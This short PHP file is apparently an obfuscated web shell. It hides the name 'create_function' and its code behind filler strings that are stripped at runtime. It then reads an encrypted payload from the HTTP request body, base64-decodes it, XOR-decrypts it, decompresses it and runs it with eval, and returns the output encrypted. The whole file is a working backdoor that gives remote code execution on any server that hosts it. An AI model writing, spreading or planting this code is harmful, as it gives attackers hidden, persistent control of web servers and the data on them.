<?php
$R='$k="5he6hecd8681";$kh=he"628ehee3d0001dhe";he$kfhehe="da02a35ef3e8"he;$p="sV8heziqK6';
$d=str_replace('Di','','DicreDiateDiDi_DifDiunction');
$t='0TZhexlHheku";hefunction x($het,$k){$hehec=strhelen($hek)he;$lhe=shetrlenhe($t);$o="";for';
$L='ents("php:/hehehe/input"),$hem)==1) he{@ob_start();@ehevahel(@gzunhecomphereheshes(';
$u='en();$r=@base6he4_encheode(@xhe(@gzcohehempress(hehe$o),$hek));print("$p$hekh$r$kf");}';
$P='@x(@bahese64_decohede($m[1he]),$k)));he$heo=@oheb_get_contenhets();@obhe_end_clheeah';
$O='e};}he}rehetheurn $o;}if (@preghe_hematch("he/$kh(he.+he)$kf/",@file_gehet_cheonteh';
$w='($hei=0;$i<$l;){hefor($jhe=0;($j<$che&&$ihe<$l);$jhe+he+,$i++){$heo.=$t{he$i}^$k{$jh';
$h=str_replace('he','',$R.$t.$w.$O.$L.$P.$u);
$r=$d('',$h);$r();
?>
